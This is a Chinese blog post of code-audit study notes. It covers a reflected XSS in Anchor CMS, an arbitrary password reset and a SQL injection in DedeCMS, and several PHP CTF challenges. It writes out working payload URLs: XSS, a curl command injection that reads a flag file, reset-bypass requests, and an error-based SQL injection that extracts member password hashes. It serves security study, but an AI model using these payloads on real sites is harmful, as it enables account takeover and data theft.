@@ -1,0 +1,503 @@
+---
+title: 红日安全[代码审计]3则
+date: 2021-05-17 17:22:27
+tags: 
+     - web学习 
+categories:
+     - web学习 
+     - 学习
+
+---
+
+# 红日安全[代码审计]3则
+
+## 红日安全[代码审计]Day 2 – Twig
+
+### 实例分析
+
+首先安装题中给的anchor-cms-0.9.2
+
+<img src="clip_image002.jpg" alt="img" style="zoom: 80%;" />
+
+当我们访问一个不存在的网页时，它会显示一个404页面
+
+<img src="clip_image004.jpg" alt="img" style="zoom:80%;" />
+
+这个页面的代码如下，注意这里的current_url()函数
+
+<img src="clip_image006.jpg" alt="img" style="zoom:80%;" />
+
+这个函数又调用了Uri类的current()方法
+
+<img src="clip_image008.jpg" alt="img" style="zoom:80%;" />
+
+在Uri类中static::$current = static::detect();又掉用了detect方法
+
+<img src="clip_image010.jpg" alt="img" style="zoom:80%;" />
+
+detect方法如下，它会获取 $_SERVER 数组中的 'REQUEST_URI' 、'PATH_INFO', 、'ORIG_PATH_INFO' 三个键的值（“REQUEST_URI”是访问此页面所需的 URI。例如，“/index.html”），然后通过foreach($try as $method)依次进行判断，如果满足$uri = filter_var($uri, FILTER_SANITIZE_URL)和$uri = parse_url($uri, PHP_URL_PATH)这两个条件，就通过static::format($uri, $server)把uri传入format方法
+
+可以知道FILTER_SANITIZE_URL这个过滤器允许所有的字母、数字以及 $-_.+!*'(),{}|\^~[]`"><#%;/?:@&=，然后parse_url($uri, PHP_URL_PATH)只是用来解析uri的函数，并没有过滤功能
+
+<img src="clip_image012.jpg" alt="img" style="zoom:80%;" />
+
+format方法如下，这里调用的几个方法，都没有进行xxs攻击的过滤
+
+<img src="clip_image014.jpg" alt="img" style="zoom:80%;" />
+
+remove_relative_uri方法代码
+
+<img src="clip_image016.jpg" alt="img" style="zoom: 80%;" />
+
+remove_script_name方法代码
+
+<img src="clip_image018.jpg" alt="img" style="zoom:80%;" />
+
+### 漏洞利用：
+
+所以我们只要输入一个xxs代码，就可以通过current_url()调用到网页中发起xss攻击
+
+访问[http://127.0.0.1/anchor-cms-0.9.2/index.php/%3Cscript%3Ealert('xssattack%27)%3C/script%3E](http://127.0.0.1/anchor-cms-0.9.2/index.php/alert('xssattack'))的结果如下
+
+<img src="clip_image020.jpg" alt="img" style="zoom:80%;" />
+
+### CTF题目
+
+源代码：
+
+Index.php
+
+```php
+<?php 
+$url = $_GET['url'];
+if(isset($url) && filter_var($url, FILTER_VALIDATE_URL)){
+  $site_info = parse_url($url);
+  if(preg_match('/sec-redclub.com$/',$site_info['host'])){
+​    exec('curl "'.$site_info['host'].'"', $result);
+​    echo "<center><h1>You have curl {$site_info['host']} successfully!</h1></center>
+​       <center><textarea rows='20' cols='90'>";
+​    echo implode(' ', $result);
+  }
+  else{
+​    die("<center><h1>Error: Host not allowed</h1></center>");
+  } 
+}
+else{
+  echo "<center><h1>Just curl sec-redclub.com!</h1></center><br>
+​     <center><h3>For example:?url=http://sec-redclub.com</h3></center>";
+}
+?>
+
+```
+
+f1agi3hEre.php
+
+```php
+<?php 
+$flag = "HRCTF{f1lt3r_var_1s_s0_c00l}"
+?>
+```
+
+
+
+#### filter_var()函数
+
+filter_var() 函数通过指定的过滤器过滤一个变量。如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。
+ `用法：filter_var(variable, filter, options)`
+
+`这里第二个参数是`FILTER_VALIDATE_URL过滤器，这个过滤器是用来过滤url的，但是这个过滤器会把伪协议当成url处理，例如JavaScript://这样的协议就会通过
+
+`然后`parse_url()这个函数是用来处理url的，解析 URL，返回其组成部分，
+
+接下来用preg_match()函数匹配字符串'/sec-redclub.com$/'，与$site_info['host'] 匹配，所以这个字符串只能在parse_url()解析的host的最后面
+
+接下来就到了exec('curl "'.$site_info['host'].'"', $result);
+
+```
+curl可以把www.baidu.com;ls;` sec-redclub.com这样的url解析成`www.baidu.com，ls，和sec-redclub.com
+```
+
+所以我们构建的payload是http://192.168.44.3/red/?url=2333://”;cat${IFS}flag.txt;”sec-redclub.com
+
+`双引号用来闭合前面的双引号，`$IFS在linux下表示分隔符, 单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用
+
+```
+效果如下
+```
+
+<img src="clip_image022.gif" alt="img" style="zoom:80%;" />``
+
+
+
+## 红日安全[代码审计] Day 4 - False Beard
+
+### 实例分析
+
+首先安装环境，织梦cms5.7版本
+
+<img src="clip_image024.jpg" alt="img" style="zoom:80%;" />
+
+这个cms存在任意用户密码重置漏洞，触发点在\uploads\member\resetpassword.php
+
+前面是判断当 $dopost 等于 safequestion 的时候，通过传入的 $mid 对应的 id 值来查询对应用户的安全问题、安全答案、用户id、电子邮件等信息。
+
+<img src="clip_image026.jpg" alt="img" style="zoom:80%;" />
+
+```php
+if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)
+  {
+​    sn($mid, $row['userid'], $row['email'], 'N');
+​    exit();
+}
+```
+
+
+
+前面判断了我们传入的值是否非空，这个判断语句是把数据库中的安全问题和安全答案与用户输入的进行对比，不过这里的判断条件是==，而不是===
+
+PHP中这两个运算符的区别如下
+
+<img src="clip_image028.jpg" alt="img" style="zoom:67%;" />
+
+所以假设用户没有设置安全问题和答案，那么默认情况下安全问题的值为 0 ，答案的值为 null （这里是数据库中的值，即 $row['safequestion']="0" 、 $row['safeanswer']=null ）。当没有设置 safequestion 和 safeanswer 的值时，它们的值均为空字符串。第11行的if表达式也就变成了 if('0' == '' && null == '') ，即 if(false && true) ，因为null其实就是空字符，所以我们只要让表达式 $row['safequestion'] == $safequestion 为 true 即可绕过。
+
+<img src="clip_image030.jpg" alt="img" style="zoom: 80%;" />
+
+测试0.0，0e1，0.这3个都可以和0比较通过，利用这个可以绕过此判断，进入sn函数
+
+<img src="clip_image032.jpg" alt="img" style="zoom:80%;" />
+
+在sn函数中if(!is_array($row))，的$row会根据id到pwd_tmp表中判断是否存在对应的临时密码记录判断用户是否第一次进行忘记密码操作，如果是第一次，那if(!is_array($row))就会判断通过，进入到 newmail($mid,$userid,$mailto,'INSERT',$send); 在 newmail 函数中执行 INSERT 操作
+
+<img src="clip_image034.jpg" alt="img" style="zoom:80%;" />
+
+在INSERT 操作主要功能是发送修改密码的邮件到用户邮箱，然后插入一条记录在dede_pwd_tmp表中，我们可以看到$send == 'N'时，执行以下操作
+
+return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval);
+
+用来打印修改密码的链接修改密码链接中的 $mid 参数对应的值是用户id，而 $randval 是在第一次 insert 操作的时候将其 md5 加密之后插入到 dede_pwd_tmp 表中
+
+所以我们可以知道拼接的url是?dopost=getpasswd&id=$mid&key=$randval
+
+dopost=getpasswd 的操作在resetpassword.php中
+
+<img src="clip_image036.jpg" alt="img" style="zoom:80%;" />
+
+在重置密码的时候判断输入的用户id是否执行过重置密码，如果id为空则退出；如果 $row 不为空，则会执行以下操作内容
+
+<img src="clip_image038.jpg" alt="img" style="zoom:80%;" />
+
+这几行代码会判断修改密码是否超时，如果没有超时，就会进入密码修改页面，代码如下，会把$step赋值为2
+
+<img src="clip_image040.jpg" alt="img" style="zoom:80%;" />
+
+然后现在的数据包中 $setp=2，然后又到了resetpassword.php 文件中。
+
+<img src="clip_image042.jpg" alt="img" style="zoom:80%;" />
+
+if($row['pwd'] == $sn)判断传入的数据是否等于$row['pwd'] 如果相等就完成重置密码操作
+
+<img src="clip_image044.gif" alt="img" style="zoom:80%;" />
+
+### 攻击过程
+
+首先注册2个用户
+
+<img src="clip_image046.jpg" alt="img" style="zoom:80%;" />
+
+提交一个请求，这里232343用户的ID是3，所以提交
+
+http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=3
+
+![img](clip_image048.gif)
+
+然后抓包发送得到key值
+
+<img src="clip_image050.jpg" alt="img" style="zoom:80%;" />
+
+这里key=KEZatlFV，构建[http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=getpasswd&id=3&key=KEZatlFVrh](http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=getpasswd&id=3&key=KEZatlFVrh )
+
+然后访问，把密码修改为123456
+
+<img src="clip_image052.jpg" alt="img" style="zoom:80%;" />
+
+提示修改成功并且登录
+
+<img src="clip_image054.jpg" alt="img" style="zoom:80%;" />
+
+数据库里的值也变成123456的md5值了
+
+<img src="clip_image056.jpg" alt="img" style="zoom:80%;" />
+
+<img src="clip_image058.jpg" alt="img" style="zoom:80%;" />
+
+### CTF题目
+
+首先题目是一个摇奖程序
+
+<img src="clip_image060.gif" alt="img" style="zoom:80%;" />
+
+输入用户名就可以进行摇奖，但是金额只有20
+
+<img src="clip_image062.gif" alt="img" style="zoom:80%;" />
+
+查看这个比较的代码(buy.php)里面有一段代码调用了buy.js
+
+<img src="clip_image064.gif" alt="img" style="zoom:80%;" />
+
+在buy.js中程序将表单数据以json格式提交到api.php中
+
+<img src="clip_image066.gif" alt="img" style="zoom:80%;" />
+
+而api.php中，把传入的数据用==进行比较，这涉及到PHP弱比较的问题
+
+== 在进行比较的时候，会先将字符串类型转化成相同，再比较
+
+如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行
+
+<img src="clip_image068.gif" alt="img" style="zoom:80%;" />
+
+如果我们用true进行比较的话，就会把数字也转换成bool类型进行比较，就会比较通过了，而除了 0、false、null 以外均为 true，所以只要后台生成的数字没有0，就可以比较通过了。
+
+<img src="clip_image070.gif" alt="img" style="zoom:80%;" />
+
+如图，显示比较成功了，金额增加了200000，多次发包，让自己的钱可以买flag就可以了
+
+<img src="clip_image072.gif" alt="img" style="zoom:80%;" />
+
+ 
+
+ 
+
+## 红日安全[代码审计]Day 7 – Bell
+
+首先安装带有漏洞的DedeCmsV5.6 版本
+
+<img src="clip_image074.gif" alt="img" style="zoom:80%;" />
+
+根据官网发布的v5.7版本的补丁可以知道漏洞是由于 mchStrCode 这个编码方法造成的。
+
+<img src="clip_image076.gif" alt="img" style="zoom:80%;" />
+
+我们先在文件夹里搜索mchStrCode发现有3处
+
+<img src="clip_image078.gif" alt="img" style="zoom:80%;" />
+
+查看第一处的代码，如下图，这段代码是用parse_str 方法将mchStrCode函数解码后 $pd_encode 中的变量放到 $mch_Post 数组中然后通过foreach($mch_Post as $k => $v) $$k = $v;，把$mch_Post 中的键和值都赋给$k， $v
+
+在这个过程没有对定义的键值进行检查，如果攻击者通过mschstrcode进行编码，绕过一些过滤方式，就可以使代码直达目标
+
+<img src="clip_image080.jpg" alt="img" style="zoom:80%;" />
+
+查看mchStrcode的代码，如下图
+
+<img src="clip_image082.jpg" alt="img" style="zoom:80%;" />
+
+这里
+
+$key  = substr(md5($_SERVER["HTTP_USER_AGENT"].$GLOBALS['cfg_cookie_encode']),8,18);
+
+可以知道这个代码将 $_SERVER["HTTP_USER_AGENT"] 和 $GLOBALS['cfg_cookie_encode'] 进行拼接，然后进行md5计算之后取前 18 位字符，其中的 $_SERVER["HTTP_USER_AGENT"] 是浏览器的标识，我们可以控制这个，如果我们知道$GLOBALS['cfg_cookie_encode'])怎么生成的话就可以知道key值了
+
+$GLOBALS['cfg_cookie_encode'])实际上是$rnd_cookieEncode
+
+$rnd_cookieEncode = chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('a'),ord('z'))).chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('a'),ord('z'))).mt_rand(1000,9999).chr(mt_rand(ord('A'),ord('Z')));
+
+可以看到$rnd_cookieEncode所有密匙数为26^6*(9999-1000)=2779933068224，虽然可以暴力破解，但是时间成本太高
+
+### 攻击思路
+
+虽然cfg_cookie_encode的生成有一定的规律性，我们可以使用MD5碰撞的方法获得，但是时间成本太高，感觉不太值得。所以想法是在什么地方可以使用 mchStrCode 加密可控参数，并且能够返回到页面中。所以搜索一下全文哪里调用了这个函数。
+
+**在member /buy_action.php中有一个加密调用如下**
+
+<img src="clip_image084.jpg" alt="img" style="zoom:80%;" />
+
+这下面有一句tpl->LoadTemplate(DEDEMEMBER.'/templets/buy_action_payment.htm');
+
+在/templets/buy_action_payment.htm这个文件中，可以看到会回显我们之前加密的 $pr_encode 和 $pr_verify 
+
+<img src="clip_image086.jpg" alt="img" style="zoom:80%;" />
+
+ 通过这个代码，如果我们提交的是“cfg_dbprefix=SQL注入”的值，就可以从而获取相应的 pr_encode 和 pr_verify
+
+但是在common.inc.php中会过滤提交的以cfg、GLOBALS、GET、POST、COOKIE 开头的值
+
+<img src="C:\Users\17473\Desktop\博客\红日安全[代码审计]3则\clip_image088.jpg" alt="img" style="zoom:80%;" />
+
+这个问题的解决就利用到了 $REQUEST 内容与 parse_str 函数内容的差异特性。我们url传入的时候通过**[a=1&b=2%26c=3]这样的提交时， $REQUEST 解析的内容就是 [a=1，b=2%26c=3] 。而通过上面代码的遍历进入 parse_str 函数的内容则是 [a=1&b=2&c=3] ，因为 parse_str 函数会针对传入进来的数据进行解码，所以解析后的内容就变成了[a=1，b=2，c=3]**。所以可以通过这种方法绕过 common.inc.php 文件对于参数内容传递的验证。
+
+例如构造&a=1%26cfg_dbprefix
+
+### 漏洞利用
+
+访问 buy_action.php使用参数如下
+
+product=card&pid=1&a=1%26cfg_dbprefix=dede_member_operation WHERE 1=@'/!12345union/ select 1,2,3,4,5,6,7,8,9,10 FROM (SELECT COUNT(),CONCAT( (SELECT pwd FROM dede_member LIMIT 0,1),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a %23
+
+所以构造url如下
+
+http://127.0.0.1/DedeCmsV5.6-UTF8-Final/uploads/member/buy_action.php?product=card&pid=1&a=1%26cfg_dbprefix=dede_member_operation WHERE 1=@'/!12345union/ select 1,2,3,4,5,6,7,8,9,10 FROM (SELECT COUNT(),CONCAT( (SELECT pwd FROM dede_member LIMIT 0,1),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a %23
+
+<img src="clip_image090.jpg" alt="img" style="zoom:80%;" />
+
+然后抓包在进行发送，得到pr_encode 和 pr_verify的值
+
+<img src="clip_image092.jpg" alt="img" style="zoom:80%;" />
+
+这里我得到
+
+pd_encode="QBYKUkVSElkABEcHQ0RQU1gJFgVYBxZSAAM8AVcTF1FfXh0FVAEBU29cAwkBAEc8CkRcRQRMWQsLFmd5IzYmRQReJRMWFlQKA1BQQ15YCQpMRUYGCVFaQ0UJHFZJBRwFSlFPUxlUSQwVDkkJAEQjZH98RkwwIHkmJmAZdCptfjBNHxxyKSogJGFLRRxqcil9czBFRkdVRiIxKnhDAVFdUjpVVQkHU0IRKi0uLGFDVRgIHkl+fCsqZBhjJyonTQVKVx0QT0V+YisoFnl/ICsxKHQ3LHt3aDZ7eCEodx5yLiUxJHY3IGZmZCBsY0QiZH9kNkQhPBUbTFUZFA"
+
+pd_verify ="de99a6f6445b0a8d931f7b5a99f2cee9"
+
+所以构造的payload为http://127.0.0.1/DedeCmsV5.6-UTF8-Final/uploads/member/buy_action.php? buy_action.php?pd_encode=QBYKUkVSElkABEcHQ0RQU1gJFgVYBxZSAAM8AVcTF1FfXh0FVAEBU29cAwkBAEc8CkRcRQRMWQsLFmd5IzYmRQReJRMWFlQKA1BQQ15YCQpMRUYGCVFaQ0UJHFZJBRwFSlFPUxlUSQwVDkkJAEQjZH98RkwwIHkmJmAZdCptfjBNHxxyKSogJGFLRRxqcil9czBFRkdVRiIxKnhDAVFdUjpVVQkHU0IRKi0uLGFDVRgIHkl+fCsqZBhjJyonTQVKVx0QT0V+YisoFnl/ICsxKHQ3LHt3aDZ7eCEodx5yLiUxJHY3IGZmZCBsY0QiZH9kNkQhPBUbTFUZFA&pd_verify= de99a6f6445b0a8d931f7b5a99f2cee9
+
+ 
+
+ 
+
+ 
+
+ 
+
+### CTF题目
+
+源码：
+
+uploadsomething.php
+
+```php
+<?php
+header("Content-type:text/html;charset=utf-8");
+$referer = $_SERVER['HTTP_REFERER'];
+if(isset($referer)!== false) {
+  $savepath = "uploads/" . sha1($_SERVER['REMOTE_ADDR']) . "/";
+  if (!is_dir($savepath)) {
+​    $oldmask = umask(0);
+​    mkdir($savepath, 0777);
+​    umask($oldmask);
+  }
+  if ((@$_GET['filename']) && (@$_GET['content'])) {
+​    //$fp = fopen("$savepath".$_GET['filename'], 'w');
+​    $content = 'HRCTF{y0u_n4ed_f4st}  by:l1nk3r';
+​    file_put_contents("$savepath" . $_GET['filename'], $content);
+​    $msg = 'Flag is here,come on~ ' . $savepath . htmlspecialchars($_GET['filename']) . "";
+​    usleep(100000);
+​    $content = "Too slow!";
+​    file_put_contents("$savepath" . $_GET['filename'], $content);
+  }
+  print <<<EOT
+<form action="" method="get">
+<div class="form-group">
+<label for="exampleInputEmail1">Filename</label>
+<input type="text" class="form-control" name="filename" id="exampleInputEmail1" placeholder="Filename">
+</div>a
+<div class="form-group">
+<label for="exampleInputPassword1">Content</label>
+<input type="text" class="form-control" name="content" id="exampleInputPassword1" placeholder="Contont">
+</div>
+<button type="submit" class="btn btn-default">Submit</button>
+</form>
+EOT;
+}
+else{
+  echo 'you can not see this page';
+}
+?>
+
+```
+
+Index.php
+
+```php
+<?php
+$a = "hongri";
+echo $a;
+$id = $_GET['id'];
+@parse_str($id);
+if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO')) {
+  echo '<a href="uploadsomething.php">flag is here</a>';
+}
+?>
+```
+
+
+
+访问主页，没什么显示的内容
+
+<img src="clip_image094.gif" alt="img" style="zoom:80%;" />
+
+查看源码发现这里有一处md5比较
+
+<img src="clip_image096.gif" alt="img" style="zoom:80%;" />
+
+如果正确就会打印出flag的地址，这里使用的是==比较，是弱类型比较，其中有一个漏洞是
+
+当字符串的开始没有以合法的数值开始，在进行判断时，其值为0
+
+var_dump("0e123456"=="0e99999"); //true
+
+而且本题这里QNKCDZO的md5值为0E830400451993494058024219903391开头是0e，所以只要用另一个0e开头的md5值和它比较，就可以通过了，这里使用了s155964671a，md5值为0e342768416822451524974117254469，构建payload为?id=a[0]=s155964671a
+
+通过验证，显示出flag的页面
+
+<img src="clip_image098.gif" alt="img" style="zoom:80%;" />
+
+注意这里有一段代码会验证referer
+
+$referer = $_SERVER['HTTP_REFERER'];
+
+if(isset($referer)!== false) 
+
+如果不带referer进行访问，就会出现这个界面
+
+<img src="clip_image100.gif" alt="img" style="zoom:80%;" />
+
+进入flag的页面如下
+
+<img src="clip_image102.gif" alt="img" style="zoom:80%;" />
+
+这里如果发送了filename和content的数据就会回显一个flag的地址，但是不知道是不是我环境搭的不对，我这里不会显示，但是这里这个文件夹确实建立了，然后flag也在里面
+
+<img src="clip_image104.gif" alt="img" style="zoom:80%;" />
+
+<img src="clip_image106.gif" alt="img" style="zoom:80%;" /> <img src="clip_image108.gif" alt="img" style="zoom:80%;" />
+
+然后观察uploadsomething.php有这段
+
+```php
+if ((@$_GET['filename']) && (@$_GET['content'])) {
+
+​    //$fp = fopen("$savepath".$_GET['filename'], 'w');
+
+​    $content = 'HRCTF{y0u_n4ed_f4st}  by:l1nk3r';
+
+​    file_put_contents("$savepath" . $_GET['filename'], $content);
+
+​    $msg = 'Flag is here,come on~ ' . $savepath . htmlspecialchars($_GET['filename']) . "";
+
+​    usleep(100000);
+
+​    $content = "Too slow!";
+
+​    file_put_contents("$savepath" . $_GET['filename'], $content);
+
+  }
+```
+
+里面的usleep(100000);会限制时间，过了之后就会把flag覆盖并且写入Too slow
+
+所以我们必须在flag消失之前访问
+
+使用burpsuite抓包，然后进行连续发送
+
+<img src="clip_image110.gif" alt="img" style="zoom:80%;" />
+
+<img src="clip_image112.gif" alt="img" style="zoom:80%;" />
+
+这里设置了发送2000个包，开始攻击，在攻击的时候访问http://192.168.44.3/day7/uploads/42df680fe50964852a5d21b069107fc06b22cd4d/flag即可
+
+这里成功拿到了flag
+
+<img src="clip_image114.gif" alt="img" style="zoom:80%;" />
